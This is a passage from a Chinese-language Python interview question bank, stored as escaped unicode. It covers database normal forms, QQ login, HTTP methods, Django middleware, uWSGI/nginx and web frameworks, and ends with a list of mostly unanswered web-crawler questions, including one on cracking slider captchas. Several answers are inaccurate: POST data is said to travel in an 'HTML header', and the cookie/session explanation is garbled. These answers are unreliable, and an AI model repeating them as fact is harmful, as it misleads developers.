\u89c4\u8303\u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd9\u4e9b\u89c4\u8303\u53c8\u79f0\u4e4b\u4e3a\u6570\u636e\u5e93\u7684\u4e09\u8303\u5f0f\uff0c\u4e00\u5171\u6709\u4e09\u6761\uff0c\u4e5f\u5b58\u5728\u7740\u5176\u4ed6\u8303\u5f0f\uff0c\u6211\u4eec\u53ea\u8981\u505a\u5230\u6ee1\u8db3\u524d\u4e09\u4e2a\u8303\u5f0f\u7684\u8981\u6c42\uff0c\u5c31\u80fd\u8bbe\u9648\u51fa\u7b26\u5408\u6211\u4eec\u7684\u6570\u636e\u5e93\u4e86\uff0c\u6211\u4eec\u4e5f\u4e0d\u80fd\u5168\u90e8\u6765\u6309\u7167\u8303\u5f0f\u7684\u8981\u6c42\u6765\u505a\uff0c\u8fd8\u8981\u8003\u8651\u5b9e\u9645\u7684\u4e1a\u52a1\u4f7f\u7528\u60c5\u51b5\uff0c\u6240\u4ee5\u6709\u65f6\u5019\u4e5f\u9700\u8981\u505a\u4e00\u4e9b\u8fdd\u53cd\u8303\u5f0f\u7684\u8981\u6c42\u3002\n1.\u6570\u636e\u5e93\u8bbe\u8ba1\u7684\u7b2c\u4e00\u8303\u5f0f(\u6700\u57fa\u672c)\uff0c\u57fa\u672c\u4e0a\u6240\u6709\u6570\u636e\u5e93\u7684\u8303\u5f0f\u90fd\u662f\u7b26\u5408\u7b2c\u4e00\u8303\u5f0f\u7684\uff0c\u7b26\u5408\u7b2c\u4e00\u8303\u5f0f\u7684\u8868\u5177\u6709\u4ee5\u4e0b\u51e0\u4e2a\u7279\u70b9\uff1a\n\n\u6570\u636e\u5e93\u8868\u4e2d\u7684\u6240\u6709\u5b57\u6bb5\u90fd\u53ea\u5177\u6709\u5355\u4e00\u5c5e\u6027\uff0c\u5355\u4e00\u5c5e\u6027\u7684\u5217\u662f\u7531\u57fa\u672c\u7684\u6570\u636e\u7c7b\u578b\uff08\u6574\u578b\uff0c\u6d6e\u70b9\u578b\uff0c\u5b57\u7b26\u578b\u7b49\uff09\u6240\u6784\u6210\u7684\u8bbe\u8ba1\u51fa\u6765\u7684\u8868\u90fd\u662f\u7b80\u5355\u7684\u4e8c\u6bd4\u8868\n\n2.\u6570\u636e\u5e93\u8bbe\u8ba1\u7684\u7b2c\u4e8c\u8303\u5f0f(\u662f\u5728\u7b2c\u4e00\u8303\u5f0f\u7684\u57fa\u7840\u4e0a\u8bbe\u8ba1\u7684)\uff0c\u8981\u6c42\u4e00\u4e2a\u8868\u4e2d\u53ea\u5177\u6709\u4e00\u4e2a\u4e1a\u52a1\u4e3b\u952e\uff0c\u4e5f\u5c31\u662f\u8bf4\u7b26\u5408\u7b2c\u4e8c\u8303\u5f0f\u7684\u8868\u4e2d\u4e0d\u80fd\u5b58\u5728\u975e\u4e3b\u952e\u5217\u5bf9\u53ea\u5bf9\u90e8\u5206\u4e3b\u952e\u7684\u4f9d\u8d56\u5173\u7cfb\n\n3.\u6570\u636e\u5e93\u8bbe\u8ba1\u7684\u7b2c\u4e09\u8303\u5f0f\uff0c\u6307\u6bcf\u4e00\u4e2a\u975e\u4e3b\u5c5e\u6027\u65e2\u4e0d\u90e8\u5206\u4f9d\u8d56\u4e0e\u4e5f\u4e0d\u4f20\u9012\u4f9d\u8d56\u4e8e\u4e1a\u52a1\u4e3b\u952e\uff0c\u4e5f\u5c31\u662f\u7b2c\u4e8c\u8303\u5f0f\u7684\u57fa\u7840\u4e0a\u6d88\u9664\u4e86\u975e\u4e3b\u5c5e\u6027\u5bf9\u4e3b\u952e\u7684\u4f20\u9012\u4f9d\u8d56\n\n### 150.\u7b80\u8ff0QQ\u767b\u9646\u8fc7\u7a0b\nqq\u767b\u5f55\uff0c\u5728\u6211\u4eec\u7684\u9879\u76ee\u4e2d\u5206\u4e3a\u4e86\u4e09\u4e2a\u63a5\u53e3\uff0c\n\n\u7b2c\u4e00\u4e2a\u63a5\u53e3\u662f\u8bf7\u6c42qq\u670d\u52a1\u5668\u8fd4\u56de\u4e00\u4e2aqq\u767b\u5f55\u7684\u754c\u9762;\n\n\u7b2c\u4e8c\u4e2a\u63a5\u53e3\u662f\u901a\u8fc7\u626b\u7801\u6216\u8d26\u53f7\u767b\u9646\u8fdb\u884c\u9a8c\u8bc1\uff0cqq\u670d\u52a1\u5668\u8fd4\u56de\u7ed9\u6d4f\u89c8\u5668\u4e00\u4e2acode\u548cstate,\u5229\u7528\u8fd9\u4e2acode\u901a\u8fc7\u672c\u5730\u670d\u52a1\u5668\u53bb\u5411qq\u670d\u52a1\u5668\u83b7\u53d6access_token\u8986\u8fd4\u56de\u7ed9\u672c\u5730\u670d\u52a1\u5668\uff0c\u51ed\u501faccess_token\u518d\u5411qq\u670d\u52a1\u5668\u83b7\u53d6\u7528\u6237\u7684openid(openid\u7528\u6237\u7684\u552f\u4e00\u6807\u8bc6)\n\n\u7b2c\u4e09\u4e2a\u63a5\u53e3\u662f\u5224\u65ad\u7528\u6237\u662f\u5426\u662f\u7b2c\u4e00\u6b21qq\u767b\u5f55\uff0c\u5982\u679c\u4e0d\u662f\u7684\u8bdd\u76f4\u63a5\u767b\u5f55\u8fd4\u56de\u7684jwt-token\u7ed9\u7528\u6237\uff0c\u5bf9\u6ca1\u6709\u7ed1\u5b9a\u8fc7\u672c\u7f51\u7ad9\u7684\u7528\u6237\uff0c\u5bf9openid\u8fdb\u884c\u52a0\u5bc6\u751f\u6210token\u8fdb\u884c\u7ed1\u5b9a\n\n### 151.post \u548c get\u7684\u533a\u522b?\n1.GET\u662f\u4ece\u670d\u52a1\u5668\u4e0a\u83b7\u53d6\u6570\u636e\uff0cPOST\u662f\u5411\u670d\u52a1\u5668\u4f20\u9001\u6570\u636e\n\n2.\u5728\u5ba2\u6237\u7aef\uff0cGET\u65b9\u5f0f\u5728\u901a\u8fc7URL\u63d0\u4ea4\u6570\u636e\uff0c\u6570\u636e\u5728URL\u4e2d\u53ef\u4ee5\u770b\u5230\uff0cPOST\u65b9\u5f0f\uff0c\u6570\u636e\u653e\u7f6e\u5728HTML\u2014\u2014HEADER\u5185\u63d0\u4ea4\n\n3.\u5bf9\u4e8eGET\u65b9\u5f0f\uff0c\u670d\u52a1\u5668\u7aef\u7528Request.QueryString\u83b7\u53d6\u53d8\u91cf\u7684\u503c\uff0c\u5bf9\u4e8ePOST\u65b9\u5f0f\uff0c\u670d\u52a1\u5668\u7aef\u7528Request.Form\u83b7\u53d6\u63d0\u4ea4\u7684\u6570\u636e\n\n\n### 152.\u9879\u76ee\u4e2d\u65e5\u5fd7\u7684\u4f5c\u7528\n\u4e00\u3001\u65e5\u5fd7\u76f8\u5173\u6982\u5ff5\n\n1.\u65e5\u5fd7\u662f\u4e00\u79cd\u53ef\u4ee5\u8ffd\u8e2a\u67d0\u4e9b\u8f6f\u4ef6\u8fd0\u884c\u65f6\u6240\u53d1\u751f\u4e8b\u4ef6\u7684\u65b9\u6cd5\n\n2.\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u5411\u4ed6\u4eec\u7684\u4ee3\u7801\u4e2d\u8c03\u7528\u65e5\u5fd7\u8bb0\u5f55\u76f8\u5173\u7684\u65b9\u6cd5\u6765\u8868\u660e\u53d1\u751f\u4e86\u67d0\u4e9b\u4e8b\u60c5\n\n3.\u4e00\u4e2a\u4e8b\u4ef6\u53ef\u4ee5\u7528\u4e00\u4e2a\u5305\u542b\u53ef\u9009\u53d8\u91cf\u6570\u636e\u7684\u6d88\u606f\u6765\u63cf\u8ff0\n\n4.\u6b64\u5916\uff0c\u4e8b\u4ef6\u4e5f\u6709\u91cd\u8981\u6027\u7684\u6982\u5ff5\uff0c\u8fd9\u4e2a\u91cd\u8981\u6027\u4e5f\u53ef\u4ee5\u88ab\u6210\u4e3a\u4e25\u91cd\u6027\u7ea7\u522b(level)\n\n\u4e8c\u3001\u65e5\u5fd7\u7684\u4f5c\u7528\n\n1.\u901a\u8fc7log\u7684\u5206\u6790\uff0c\u53ef\u4ee5\u65b9\u4fbf\u7528\u6237\u4e86\u89e3\u7cfb\u7edf\u6216\u8f6f\u4ef6\u3001\u5e94\u7528\u7684\u8fd0\u884c\u60c5\u51b5;\n\n2.\u5982\u679c\u4f60\u7684\u5e94\u7528log\u8db3\u591f\u4e30\u5bcc\uff0c\u53ef\u4ee5\u5206\u6790\u4ee5\u5f80\u7528\u6237\u7684\u64cd\u4f5c\u884c\u4e3a\u3001\u7c7b\u578b\u559c\u597d\uff0c\u5730\u57df\u5206\u5e03\u6216\u5176\u4ed6\u66f4\u591a\u4fe1\u606f;\n\n3.\u5982\u679c\u4e00\u4e2a\u5e94\u7528\u7684log\u540c\u65f6\u4e5f\u5206\u4e86\u591a\u4e2a\u7ea7\u522b\uff0c\u90a3\u4e48\u53ef\u4ee5\u5f88\u8f7b\u6613\u5730\u5206\u6790\u5f97\u5230\u8be5\u5e94\u7528\u7684\u5065\u5eb7\u72b6\u51b5\uff0c\u53ca\u65f6\u53d1\u73b0\u95ee\u9898\u5e76\u5feb\u901f\u5b9a\u4f4d\u3001\u89e3\u51b3\u95ee\u9898\uff0c\u8865\u6551\u635f\u5931\u3002\n\n4.\u7b80\u5355\u6765\u8bb2\u5c31\u662f\u6211\u4eec\u901a\u8fc7\u8bb0\u5f55\u548c\u5206\u6790\u65e5\u5fd7\u53ef\u4ee5\u4e86\u89e3\u4e00\u4e2a\u7cfb\u7edf\u6216\u8f6f\u4ef6\u7a0b\u5e8f\u8fd0\u884c\u60c5\u51b5\u662f\u5426\u6b63\u5e38\uff0c\u4e5f\u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u51fa\u73b0\u6545\u969c\u65f6\u5feb\u901f\u5b9a\u4f4d\u95ee\u9898\u3002\u4e0d\u4ec5\u5728\u5f00\u53d1\u4e2d\uff0c\u5728\u8fd0\u7ef4\u4e2d\u65e5\u5fd7\u4e5f\u5f88\u91cd\u8981\uff0c\u65e5\u5fd7\u7684\u4f5c\u7528\u4e5f\u53ef\u4ee5\u7b80\u5355\u3002\u603b\u7ed3\u4e3a\u4ee5\u4e0b\u51e0\u70b9\uff1a\n\n1.\u7a0b\u5e8f\u8c03\u8bd5\n\n2.\u4e86\u89e3\u8f6f\u4ef6\u7a0b\u5e8f\u8fd0\u884c\u60c5\u51b5\uff0c\u662f\u5426\u6b63\u5e38\n\n3,\u8f6f\u4ef6\u7a0b\u5e8f\u8fd0\u884c\u6545\u969c\u5206\u6790\u4e0e\u95ee\u9898\u5b9a\u4f4d\n\n4,\u5982\u679c\u5e94\u7528\u7684\u65e5\u5fd7\u4fe1\u606f\u8db3\u591f\u8be6\u7ec6\u548c\u4e30\u5bcc\uff0c\u8fd8\u53ef\u4ee5\u7528\u6765\u505a\u7528\u6237\u884c\u4e3a\u5206\u6790\n\n### 153.django\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528\uff1f\nDjango\u5728\u4e2d\u95f4\u4ef6\u4e2d\u9884\u7f6e\u4e86\u516d\u4e2a\u65b9\u6cd5\uff0c\u8fd9\u516d\u4e2a\u65b9\u6cd5\u7684\u533a\u522b\u5728\u4e8e\u4e0d\u540c\u7684\u9636\u6bb5\u6267\u884c\uff0c\u5bf9\u8f93\u5165\u6216\u8f93\u51fa\u8fdb\u884c\u5e72\u9884\uff0c\u65b9\u6cd5\u5982\u4e0b\uff1a\n\n1.\u521d\u59cb\u5316\uff1a\u65e0\u9700\u4efb\u4f55\u53c2\u6570\uff0c\u670d\u52a1\u5668\u54cd\u5e94\u7b2c\u4e00\u4e2a\u8bf7\u6c42\u7684\u65f6\u5019\u8c03\u7528\u4e00\u6b21\uff0c\u7528\u4e8e\u786e\u5b9a\u662f\u5426\u542f\u7528\u5f53\u524d\u4e2d\u95f4\u4ef6\n```python\ndef __init__():\n    pass\n```\n2.\u5904\u7406\u8bf7\u6c42\u524d\uff1a\u5728\u6bcf\u4e2a\u8bf7\u6c42\u4e0a\u8c03\u7528\uff0c\u8fd4\u56deNone\u6216HttpResponse\u5bf9\u8c61\u3002\n```python\ndef process_request(request):\n    pass\n```\n3.\u5904\u7406\u89c6\u56fe\u524d:\u5728\u6bcf\u4e2a\u8bf7\u6c42\u4e0a\u8c03\u7528\uff0c\u8fd4\u56deNone\u6216HttpResponse\u5bf9\u8c61\u3002\n```python\ndef process_view(request,view_func,view_args,view_kwargs):\n    pass\n```\n4.\u5904\u7406\u6a21\u677f\u54cd\u5e94\u524d\uff1a\u5728\u6bcf\u4e2a\u8bf7\u6c42\u4e0a\u8c03\u7528\uff0c\u8fd4\u56de\u5b9e\u73b0\u4e86render\u65b9\u6cd5\u7684\u54cd\u5e94\u5bf9\u8c61\u3002\n```python\ndef process_template_response(request,response):\n    pass\n```\n5.\u5904\u7406\u54cd\u5e94\u540e\uff1a\u6240\u6709\u54cd\u5e94\u8fd4\u56de\u6d4f\u89c8\u5668\u4e4b\u524d\u88ab\u8c03\u7528\uff0c\u5728\u6bcf\u4e2a\u8bf7\u6c42\u4e0a\u8c03\u7528\uff0c\u8fd4\u56deHttpResponse\u5bf9\u8c61\u3002\n```python\ndef process_response(request,response):\n    pass\n```\n6.\u5f02\u5e38\u5904\u7406\uff1a\u5f53\u89c6\u56fe\u629b\u51fa\u5f02\u5e38\u65f6\u8c03\u7528\uff0c\u5728\u6bcf\u4e2a\u8bf7\u6c42\u4e0a\u8c03\u7528\uff0c\u8fd4\u56de\u4e00\u4e2aHttpResponse\u5bf9\u8c61\u3002\n```python\ndef process_exception(request,exception):\n    pass\n```\n### 154.\u8c08\u4e00\u4e0b\u4f60\u5bf9uWSGI\u548cnginx\u7684\u7406\u89e3\uff1f\n1.uWSGI\u662f\u4e00\u4e2aWeb\u670d\u52a1\u5668\uff0c\u5b83\u5b9e\u73b0\u4e86WSGI\u534f\u8bae\u3001uwsgi\u3001http\u7b49\u534f\u8bae\u3002Nginx\u4e2dHttpUwsgiModule\u7684\u4f5c\u7528\u662f\u4e0euWSGI\u670d\u52a1\u5668\u8fdb\u884c\u4ea4\u6362\u3002WSGI\u662f\u4e00\u79cdWeb\u670d\u52a1\u5668\u7f51\u5173\u63a5\u53e3\u3002\u5b83\u662f\u4e00\u4e2aWeb\u670d\u52a1\u5668\uff08\u5982nginx\uff0cuWSGI\u7b49\u670d\u52a1\u5668\uff09\u4e0eweb\u5e94\u7528\uff08\u5982\u7528Flask\u6846\u67b6\u5199\u7684\u7a0b\u5e8f\uff09\u901a\u4fe1\u7684\u4e00\u79cd\u89c4\u8303\u3002\n\n\u8981\u6ce8\u610fWSGI\/uwsgi\/uWSGI\u8fd9\u4e09\u4e2a\u6982\u5ff5\u7684\u533a\u5206\u3002\n\nWSGI\u662f\u4e00\u79cd\u901a\u4fe1\u534f\u8bae\u3002\n\nuwsgi\u662f\u4e00\u79cd\u7ebf\u8def\u534f\u8bae\u800c\u4e0d\u662f\u901a\u4fe1\u534f\u8bae\uff0c\u5728\u6b64\u5e38\u7528\u4e8e\u5728uWSGI\u670d\u52a1\u5668\u4e0e\u5176\u4ed6\u7f51\u7edc\u670d\u52a1\u5668\u7684\u6570\u636e\u901a\u4fe1\u3002\n\nuWSGI\u662f\u5b9e\u73b0\u4e86uwsgi\u548cWSGI\u4e24\u79cd\u534f\u8bae\u7684Web\u670d\u52a1\u5668\u3002\n\nnginx \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u9ad8\u6027\u80fd\u7684HTTP\u670d\u52a1\u5668\u548c\u53cd\u5411\u4ee3\u7406\uff1a\n\n1.\u4f5c\u4e3aweb\u670d\u52a1\u5668\uff0c\u5b83\u5904\u7406\u9759\u6001\u6587\u4ef6\u548c\u7d22\u5f15\u6587\u4ef6\u6548\u679c\u975e\u5e38\u9ad8\n\n2.\u5b83\u7684\u8bbe\u8ba1\u975e\u5e38\u6ce8\u91cd\u6548\u7387\uff0c\u6700\u5927\u652f\u63015\u4e07\u4e2a\u5e76\u53d1\u8fde\u63a5\uff0c\u4f46\u53ea\u5360\u7528\u5f88\u5c11\u7684\u5185\u5b58\u7a7a\u95f4\n\n3.\u7a33\u5b9a\u6027\u9ad8\uff0c\u914d\u7f6e\u7b80\u6d01\u3002\n\n4.\u5f3a\u5927\u7684\u53cd\u5411\u4ee3\u7406\u548c\u8d1f\u8f7d\u5747\u8861\u529f\u80fd\uff0c\u5e73\u8861\u96c6\u7fa4\u4e2d\u5404\u4e2a\u670d\u52a1\u5668\u7684\u8d1f\u8f7d\u538b\u529b\u5e94\u7528\n\n### 155.Python\u4e2d\u4e09\u5927\u6846\u67b6\u5404\u81ea\u7684\u5e94\u7528\u573a\u666f\uff1f\ndjango:\u4e3b\u8981\u662f\u7528\u6765\u641e\u5feb\u901f\u5f00\u53d1\u7684\uff0c\u4ed6\u7684\u4eae\u70b9\u5c31\u662f\u5feb\u901f\u5f00\u53d1\uff0c\u8282\u7ea6\u6210\u672c\uff0c,\u5982\u679c\u8981\u5b9e\u73b0\u9ad8\u5e76\u53d1\u7684\u8bdd\uff0c\u5c31\u8981\u5bf9django\u8fdb\u884c\u4e8c\u6b21\u5f00\u53d1\uff0c\u6bd4\u5982\u628a\u6574\u4e2a\u7b28\u91cd\u7684\u6846\u67b6\u7ed9\u62c6\u6389\u81ea\u5df1\u5199socket\u5b9e\u73b0http\u7684\u901a\u4fe1,\u5e95\u5c42\u7528\u7eafc,c++\u5199\u63d0\u5347\u6548\u7387\uff0cORM\u6846\u67b6\u7ed9\u5e72\u6389\uff0c\u81ea\u5df1\u7f16\u5199\u5c01\u88c5\u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\u7684\u6846\u67b6,ORM\u867d\u7136\u9762\u5411\u5bf9\u8c61\u6765\u64cd\u4f5c\u6570\u636e\u5e93\uff0c\u4f46\u662f\u5b83\u7684\u6548\u7387\u5f88\u4f4e\uff0c\u4f7f\u7528\u5916\u952e\u6765\u8054\u7cfb\u8868\u4e0e\u8868\u4e4b\u95f4\u7684\u67e5\u8be2;\nflask: \u8f7b\u91cf\u7ea7\uff0c\u4e3b\u8981\u662f\u7528\u6765\u5199\u63a5\u53e3\u7684\u4e00\u4e2a\u6846\u67b6\uff0c\u5b9e\u73b0\u524d\u540e\u7aef\u5206\u79bb\uff0c\u63d0\u8003\u5f00\u53d1\u6548\u7387\uff0cFlask\u672c\u8eab\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5185\u6838\uff0c\u5176\u4ed6\u51e0\u4e4e\u6240\u6709\u7684\u529f\u80fd\u90fd\u8981\u7528\u5230\u6269\u5c55(\u90ae\u4ef6\u6269\u5c55Flask-Mail\uff0c\u7528\u6237\u8ba4\u8bc1Flask-Login),\u90fd\u9700\u8981\u7528\u7b2c\u4e09\u65b9\u7684\u6269\u5c55\u6765\u5b9e\u73b0\u3002\u6bd4\u5982\u53ef\u4ee5\u7528Flask-extension\u52a0\u5165ORM\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u8eab\u4efd\u9a8c\u8bc1\u7b49\u3002Flask\u6ca1\u6709\u9ed8\u8ba4\u4f7f\u7528\u7684\u6570\u636e\u5e93\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9MySQL\uff0c\u4e5f\u53ef\u4ee5\u7528NoSQL\u3002\n\n\u5176WSGI\u5de5\u5177\u7bb1\u7528Werkzeug(\u8def\u7531\u6a21\u5757)\uff0c\u6a21\u677f\u5f15\u64ce\u5219\u4f7f\u7528Jinja2,\u8fd9\u4e24\u4e2a\u4e5f\u662fFlask\u6846\u67b6\u7684\u6838\u5fc3\u3002\n\nTornado\uff1a Tornado\u662f\u4e00\u79cdWeb\u670d\u52a1\u5668\u8f6f\u4ef6\u7684\u5f00\u6e90\u7248\u672c\u3002Tornado\u548c\u73b0\u5728\u7684\u4e3b\u6d41Web\u670d\u52a1\u5668\u6846\u67b6\uff08\u5305\u62ec\u5927\u591a\u6570Python\u7684\u6846\u67b6\uff09\u6709\u7740\u660e\u663e\u7684\u533a\u522b\uff1a\u5b83\u662f\u975e\u963b\u585e\u5f0f\u670d\u52a1\u5668\uff0c\u800c\u4e14\u901f\u5ea6\u76f8\u5f53\u5feb\u3002\u5f97\u5229\u4e8e\u5176\u975e\u963b\u585e\u7684\u65b9\u5f0f\u548c\u5bf9epoll\u7684\u8fd0\u7528\uff0cTornado\u6bcf\u79d2\u53ef\u4ee5\u5904\u7406\u6570\u4ee5\u5343\u8ba1\u7684\u8fde\u63a5\u56e0\u6b64Tornado\u662f\u5b9e\u65f6Web\u670d\u52a1\u7684\u4e00\u4e2a\u7406\u60f3\u6846\u67b6\n### 156.Django\u4e2d\u54ea\u91cc\u7528\u5230\u4e86\u7ebf\u7a0b\uff1f\u54ea\u91cc\u7528\u5230\u4e86\u534f\u7a0b\uff1f\u54ea\u91cc\u7528\u5230\u4e86\u8fdb\u7a0b\uff1f\n1.Django\u4e2d\u8017\u65f6\u7684\u4efb\u52a1\u7528\u4e00\u4e2a\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u6765\u6267\u884c\uff0c\u6bd4\u5982\u53d1\u90ae\u4ef6\uff0c\u4f7f\u7528celery.\n\n2.\u90e8\u7f72django\u9879\u76ee\u662f\u65f6\u5019\uff0c\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bbe\u7f6e\u4e86\u8fdb\u7a0b\u548c\u534f\u7a0b\u7684\u76f8\u5173\u914d\u7f6e\u3002\n\n### 157.\u6709\u7528\u8fc7Django REST framework\u5417\uff1f\nDjango REST framework\u662f\u4e00\u4e2a\u5f3a\u5927\u800c\u7075\u6d3b\u7684Web API\u5de5\u5177\u3002\u4f7f\u7528RESTframework\u7684\u7406\u7531\u6709\uff1a\n\nWeb browsable API\u5bf9\u5f00\u53d1\u8005\u6709\u6781\u5927\u7684\u597d\u5904\n\n\u5305\u62ecOAuth1a\u548cOAuth2\u7684\u8ba4\u8bc1\u7b56\u7565\n\n\u652f\u6301ORM\u548c\u975eORM\u6570\u636e\u8d44\u6e90\u7684\u5e8f\u5217\u5316\n\n\u5168\u7a0b\u81ea\u5b9a\u4e49\u5f00\u53d1--\u5982\u679c\u4e0d\u60f3\u4f7f\u7528\u66f4\u52a0\u5f3a\u5927\u7684\u529f\u80fd\uff0c\u53ef\u4ec5\u4ec5\u4f7f\u7528\u5e38\u89c4\u7684function-based views\u989d\u5916\u7684\u6587\u6863\u548c\u5f3a\u5927\u7684\u793e\u533a\u652f\u6301\n### 158.\u5bf9cookies\u4e0esession\u7684\u4e86\u89e3\uff1f\u4ed6\u4eec\u80fd\u5355\u72ec\u7528\u5417\uff1f\nSession\u91c7\u7528\u7684\u662f\u5728\u670d\u52a1\u5668\u7aef\u4fdd\u6301\u72b6\u6001\u7684\u65b9\u6848\uff0c\u800cCookie\u91c7\u7528\u7684\u662f\u5728\u5ba2\u6237\u7aef\u4fdd\u6301\u72b6\u6001\u7684\u65b9\u6848\u3002\u4f46\u662f\u7981\u7528Cookie\u5c31\u4e0d\u80fd\u5f97\u5230Session\u3002\u56e0\u4e3aSession\u662f\u7528Session ID\u6765\u786e\u5b9a\u5f53\u524d\u5bf9\u8bdd\u6240\u5bf9\u5e94\u7684\u670d\u52a1\u5668Session\uff0c\u800cSession ID\u662f\u901a\u8fc7Cookie\u6765\u4f20\u9012\u7684\uff0c\u7981\u7528Cookie\u76f8\u5f53\u4e8eSessionID,\u4e5f\u5c31\u5f97\u4e0d\u5230Session\u3002\n\n## \u722c\u866b\n### 159.\u8bd5\u5217\u51fa\u81f3\u5c11\u4e09\u79cd\u76ee\u524d\u6d41\u884c\u7684\u5927\u578b\u6570\u636e\u5e93\n### 160.\u5217\u4e3e\u60a8\u4f7f\u7528\u8fc7\u7684Python\u7f51\u7edc\u722c\u866b\u6240\u7528\u5230\u7684\u7f51\u7edc\u6570\u636e\u5305?\n\nrequests, urllib,urllib2, httplib2\n\n### 161.\u722c\u53d6\u6570\u636e\u540e\u4f7f\u7528\u54ea\u4e2a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u7684\uff0c\u4e3a\u4ec0\u4e48\uff1f\n\n### 162.\u4f60\u7528\u8fc7\u7684\u722c\u866b\u6846\u67b6\u6216\u8005\u6a21\u5757\u6709\u54ea\u4e9b\uff1f\u4f18\u7f3a\u70b9\uff1f\n\nPython\u81ea\u5e26\uff1aurllib,urllib2\n\n\u7b2c\u4e09\u65b9\uff1arequests\n\n\u6846\u67b6\uff1a Scrapy\n\nurllib \u548curllib2\u6a21\u5757\u90fd\u505a\u4e0e\u8bf7\u6c42URL\u76f8\u5173\u7684\u64cd\u4f5c\uff0c\u4f46\u4ed6\u4eec\u63d0\u4f9b\u4e0d\u540c\u7684\u529f\u80fd\u3002\n\nurllib2: urllib2.urlopen\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2aRequest\u5bf9\u8c61\u6216\u8005url,(\u5728\u63a5\u53d7Request\u5bf9\u8c61\u65f6\uff0c\u5e76\u4ee5\u6b64\u53ef\u4ee5\u6765\u8bbe\u7f6e\u4e00\u4e2aURL\u7684headers),urllib.urlopen\u53ea\u63a5\u6536\u4e00\u4e2aurl\u3002\n\nurllib \u6709urlencode,urllib2\u6ca1\u6709\uff0c\u56e0\u6b64\u603b\u662furllib, urllib2\u5e38\u4f1a\u4e00\u8d77\u4f7f\u7528\u7684\u539f\u56e0\n\nscrapy\u662f\u5c01\u88c5\u8d77\u6765\u7684\u6846\u67b6\uff0c\u4ed6\u5305\u542b\u4e86\u4e0b\u8f7d\u5668\uff0c\u89e3\u6790\u5668\uff0c\u65e5\u5fd7\u53ca\u5f02\u5e38\u5904\u7406\uff0c\u57fa\u4e8e\u591a\u7ebf\u7a0b\uff0ctwisted\u7684\u65b9\u5f0f\u5904\u7406\uff0c\u5bf9\u4e8e\u56fa\u5b9a\u5355\u4e2a\u7f51\u7ad9\u7684\u722c\u53d6\u5f00\u53d1\uff0c\u6709\u4f18\u52bf\uff0c\u4f46\u662f\u5bf9\u4e8e\u591a\u7f51\u7ad9\u722c\u53d6100\u4e2a\u7f51\u7ad9\uff0c\u5e76\u53d1\u53ca\u5206\u5e03\u5f0f\u5904\u7406\u4e0d\u591f\u7075\u6d3b\uff0c\u4e0d\u4fbf\u8c03\u6574\u4e0e\u6269\u5c55\n\nrequests\u662f\u4e00\u4e2aHTTP\u5e93\uff0c\u5b83\u53ea\u662f\u7528\u6765\u8bf7\u6c42\uff0c\u5b83\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u5e93\uff0c\u4e0b\u8f7d\uff0c\u89e3\u6790\u5168\u90e8\u81ea\u5df1\u5904\u7406\uff0c\u7075\u6d3b\u6027\u9ad8\n\nScrapy\u4f18\u70b9\uff1a\u5f02\u6b65\uff0cxpath\uff0c\u5f3a\u5927\u7684\u7edf\u8ba1\u548clog\u7cfb\u7edf\uff0c\u652f\u6301\u4e0d\u540curl\u3002shell\u65b9\u4fbf\u72ec\u7acb\u8c03\u8bd5\u3002\u5199middleware\u65b9\u4fbf\u8fc7\u6ee4\u3002\u901a\u8fc7\u7ba1\u9053\u5b58\u5165\u6570\u636e\u5e93\n\n### 163.\u5199\u722c\u866b\u662f\u7528\u591a\u8fdb\u7a0b\u597d\uff1f\u8fd8\u662f\u591a\u7ebf\u7a0b\u597d\uff1f\n### 164.\u5e38\u89c1\u7684\u53cd\u722c\u866b\u548c\u5e94\u5bf9\u65b9\u6cd5\uff1f\n### 165.\u89e3\u6790\u7f51\u9875\u7684\u89e3\u6790\u5668\u4f7f\u7528\u6700\u591a\u7684\u662f\u54ea\u51e0\u4e2a?\n### 166.\u9700\u8981\u767b\u5f55\u7684\u7f51\u9875\uff0c\u5982\u4f55\u89e3\u51b3\u540c\u65f6\u9650\u5236ip\uff0ccookie,session\n### 167.\u9a8c\u8bc1\u7801\u7684\u89e3\u51b3?\n### 168.\u4f7f\u7528\u6700\u591a\u7684\u6570\u636e\u5e93\uff0c\u5bf9\u4ed6\u4eec\u7684\u7406\u89e3\uff1f\n### 169.\u7f16\u5199\u8fc7\u54ea\u4e9b\u722c\u866b\u4e2d\u95f4\u4ef6\uff1f\n### 170.\u201c\u6781\u9a8c\u201d\u6ed1\u52a8\u9a8c\u8bc1\u7801\u5982\u4f55\u7834\u89e3\uff1f\n### 171.\u722c\u866b\u591a\u4e45\u722c\u4e00\u6b21\uff0c\u722c\u4e0b\u6765\u7684\u6570\u636e\u662f\u600e\u4e48\u5b58\u50a8\uff1f\n### 172.cookie\u8fc7\u671f\u7684\u5904\u7406\u95ee\u9898\uff1f\n### 173.\u52a8\u6001\u52a0\u8f7d\u53c8\u5bf9\u53ca\u65f6\u6027\u8981\u6c42\u5f88\u9ad8\u600e\u4e48\u5904\u7406\uff1f\n### 174.HTTPS\u6709\u4ec0\u4e48\u4f18\u70b9\u548c\u7f3a\u70b9\uff1f\n### 175.HTTPS\u662f\u5982\u4f55\u5b9e\u73b0\u5b89\u5168\u4f20\u8f93\u6570\u636e\u7684\uff1f\n### 176.TTL\uff0cMSL\uff0cRTT\u5404\u662f\u4ec0\u4e48\uff1f\n### 177.\u8c08\u4e00\u8c08\u4f60\u5bf9Selenium\u548cPhantomJS\u4e86\u89e3\n### 178.\u5e73\u5e38\u600e\u4e48\u4f7f\u7528\u4ee3\u7406\u7684 \uff1f\n### 179.\u5b58\u653e\u5728\u6570\u636e\u5e93(redis\u3001mysql\u7b49)\u3002\n### 180.\u600e\u4e48\u76d1\u63a7\u722c\u866b\u7684\u72b6\u6001?\n### 181.\u63cf\u8ff0\u4e0bscrapy\u6846\u67b6\u8fd0\u884c\u7684\u673a\u5236\uff1f\n### 